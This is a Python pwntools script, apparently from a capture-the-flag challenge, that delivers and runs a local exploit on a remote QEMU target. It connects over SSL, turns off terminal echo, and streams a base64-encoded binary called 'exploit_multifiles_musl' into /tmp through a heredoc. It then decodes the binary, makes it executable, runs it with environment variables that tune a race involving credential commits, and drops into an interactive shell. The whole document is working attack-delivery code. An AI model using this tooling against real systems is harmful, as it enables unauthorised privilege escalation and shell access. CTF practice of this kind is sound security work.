from pwn import *
import base64
import time
import sys

# Configuration
HOST = 'multifiles.opus4-7.b01le.rs'
PORT = 8443
FILE_NAME = 'exploit_multifiles_musl'
# Safely below standard 255-byte TTY line limits
CHUNK_SIZE = 100
PROMPT = b'$ '

try:
    with open(FILE_NAME, 'rb') as f:
        encoded_payload = base64.b64encode(f.read()).decode()
except FileNotFoundError:
    print(f"[-] Error: Could not find '{FILE_NAME}'.")
    sys.exit(1)

print(f"[*] Connecting to {HOST}:{PORT} over SSL...")
r = remote(HOST, PORT, ssl=True)

print("[*] Waiting for the boot sequence to finish...")
r.recvuntil(PROMPT)

print("[*] Disabling echo and initiating heredoc...")
r.sendline(b"stty -echo")
time.sleep(0.5)

r.sendline(b"cat > /tmp/exploit.b64 <<'EOF'")
time.sleep(0.1)

print(f"[*] Streaming {len(encoded_payload)} bytes into heredoc...")
for i in range(0, len(encoded_payload), CHUNK_SIZE):
    chunk = encoded_payload[i:i+CHUNK_SIZE]

    # FIXED: sendline adds the \n so the remote TTY line buffer flushes
    r.sendline(chunk.encode())

    # Tiny delay to prevent QEMU serial buffer overrun
    time.sleep(0.01)

    if i % (CHUNK_SIZE * 50) == 0 and i > 0:
        print(f"    Sent {i} / {len(encoded_payload)} bytes")

# FIXED: Just send EOF (sendline already handled the previous newline)
print("[*] Finalizing heredoc...")
r.sendline(b"EOF")
time.sleep(0.5)

print("[*] Restoring terminal and decoding base64...")
r.sendline(b"stty echo")
time.sleep(0.5)
r.clean() # Clear out any stray buffer bytes

r.sendline(b"base64 -d /tmp/exploit.b64 > /tmp/exploit")
r.recvuntil(PROMPT)

r.sendline(b"chmod +x /tmp/exploit")
r.recvuntil(PROMPT)

print("[*] Executing exploit with environment variables...")
exploit_cmd = "MF_CHILDREN=256 MF_CRED_COMMITS=8 MF_OPEN_ONLY=1 MF_WAIT_SLEEP_US=50000 MF_CHILD_SLEEP_US=1000 MF_READY_WAIT_US=6000000 MF_CONTINUE_FOREIGN=1 MF_WAKE_PER_PAGE=1 MF_MAX_FOREIGN=420 MF_FOREIGN_DELAY_US=500000 /tmp/exploit"
r.sendline(exploit_cmd.encode())

print("[+] Exploit running. Dropping to interactive shell.")
r.interactive()